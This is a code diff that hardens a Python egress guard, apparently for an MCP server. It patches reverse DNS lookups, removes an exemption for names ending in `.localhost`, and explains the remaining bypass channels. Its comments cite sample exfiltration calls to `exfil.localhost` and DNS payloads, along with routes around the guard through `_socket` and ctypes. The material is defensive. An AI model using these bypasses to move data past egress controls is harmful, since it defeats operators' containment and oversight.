@@ -17,15 +17,20 @@ examples above uncovered.** A licence check over DNS never calls `connect` at al
 and `gethostbyname` are module-level C functions, and an armed process resolved any name it liked,
 which is a full round trip to a resolver. A datagram socket never calls `connect` either, so
 `sendto`/`sendmsg` carried payload straight out. Both were measured, and both are patched here now,
-along with `connect`/`connect_ex`.
+along with `connect`/`connect_ex`. **A reverse lookup is the same round trip run backwards** —
+`getnameinfo` and `gethostbyaddr` resolve an address to a name, and the *address* is then the covert
+channel; both completed with the guard armed until they were patched too.
 
 **What it deliberately does not touch, and what covers each instead.** Serving is
 `bind`/`listen`/`accept`, which are different calls, so an armed process still answers requests
 normally. Loopback stays open: a sidecar, a health probe against ourselves, and the in-process test
 client all live there. Non-`AF_INET` families (Unix sockets) pass, because they cannot leave the
-host. And three channels are outside any in-process patch by construction — a **child process**
-(`subprocess`, `os.system`), a **`ctypes` call straight into `libc.connect`**, and any syscall made
-from a compiled extension. Those are `make offline-run`'s job: it takes the network namespace away,
+host. And four channels are outside any in-process patch by construction — a **child process**
+(`subprocess`, `os.system`), a **`ctypes` call straight into `libc.connect`**, the private C type
+**`_socket.socket`** (whose methods `arm()` rebinds only on the Python `socket.socket` subclass, so
+a `_socket.socket().connect(...)` never sees the guard — caught statically by `no_egress.py`, which
+lists `_socket`), and any syscall made from a compiled extension. Those are `make offline-run`'s
+job: it takes the network namespace away,
 which is the only layer that does not depend on the caller going through Python. `servers/pyexec`
 is the server this matters most for, and its README states the same division — the child process
 and its rlimits are the boundary there, not the guards inside the parent.
@@ -70,6 +75,8 @@ _original_sendmsg = socket.socket.sendmsg
 _original_getaddrinfo = socket.getaddrinfo
 _original_gethostbyname = socket.gethostbyname
 _original_gethostbyname_ex = socket.gethostbyname_ex
+_original_getnameinfo = socket.getnameinfo
+_original_gethostbyaddr = socket.gethostbyaddr
 
 _armed = False
 _allowed: frozenset[str] = frozenset()
@@ -96,9 +103,17 @@ def _is_loopback(host: str) -> bool:
     """Whether `host` names this machine — the one destination that is never egress.
 
     Literal addresses are decided by `ipaddress`, so the whole of `127.0.0.0/8` and `::1` count
-    rather than the two spellings people remember. A name is only loopback if it *is* `localhost`
-    (or a subdomain of it): resolving an arbitrary name here would mean a DNS lookup, which is
-    itself a call out, and a guard whose check leaks is not a guard.
+    rather than the two spellings people remember. A name is only loopback if it *is* exactly
+    `localhost`: resolving an arbitrary name here would mean a DNS lookup, which is itself a call
+    out, and a guard whose check leaks is not a guard.
+
+    **A `.localhost` *suffix* is not loopback, and treating it as one was a bypass.** The rule used
+    to exempt any name ending in `.localhost`, but the OS resolver decides what such a name points
+    at — measured, `connect(("exfil.localhost", 80))` reached a public address given an
+    `/etc/hosts` entry, and `getaddrinfo("<payload>.localhost")` was permitted, i.e. DNS
+    exfiltration through a name the guard waved through. Only the exact string `localhost` and real
+    loopback IP literals pass now. A site that genuinely serves a `.localhost` name adds it to
+    `MCP_EGRESS_ALLOW`, the one sanctioned way to widen the guard.
 
     **The unspecified address counts too, and it started mattering when this guard grew to cover
     `getaddrinfo`.** `0.0.0.0` and `::` are what a container binds to, not somewhere to reach — and
@@ -108,8 +123,6 @@ def _is_loopback(host: str) -> bool:
     """
     bare = host.strip("[]").lower()
     if bare in {"localhost", ""}:
-        return True
-    if bare.endswith(".localhost"):
         return True
     try:
         parsed = ipaddress.ip_address(bare.split("%", 1)[0])
@@ -256,6 +269,17 @@ def arm(allow: Iterable[str] = ()) -> None:
         _check((hostname, 0))
         return _original_gethostbyname_ex(hostname)
 
+    def getnameinfo(sockaddr: Any, flags: Any) -> Any:
+        # A reverse lookup: `sockaddr` is the `(address, port)` tuple `_host_of` already reads, and
+        # the address it resolves is the covert channel. Loopback still passes, so a name for the
+        # server's own socket resolves normally.
+        _check(sockaddr)
+        return _original_getnameinfo(sockaddr, flags)
+
+    def gethostbyaddr(ip_address: Any) -> Any:
+        _check((ip_address, 0))
+        return _original_gethostbyaddr(ip_address)
+
     socket.socket.connect = connect  # type: ignore[method-assign,assignment]
     socket.socket.connect_ex = connect_ex  # type: ignore[method-assign,assignment]
     socket.socket.sendto = sendto  # type: ignore[method-assign,assignment]
@@ -263,6 +287,8 @@ def arm(allow: Iterable[str] = ()) -> None:
     socket.getaddrinfo = getaddrinfo
     socket.gethostbyname = gethostbyname
     socket.gethostbyname_ex = gethostbyname_ex
+    socket.getnameinfo = getnameinfo
+    socket.gethostbyaddr = gethostbyaddr
     _armed = True
     EGRESS_GUARD_ARMED.set(1)
 
@@ -277,6 +303,8 @@ def disarm() -> None:
     socket.getaddrinfo = _original_getaddrinfo
     socket.gethostbyname = _original_gethostbyname
     socket.gethostbyname_ex = _original_gethostbyname_ex
+    socket.getnameinfo = _original_getnameinfo
+    socket.gethostbyaddr = _original_gethostbyaddr
     _armed = False
     _allowed = frozenset()
     EGRESS_GUARD_ARMED.set(0)
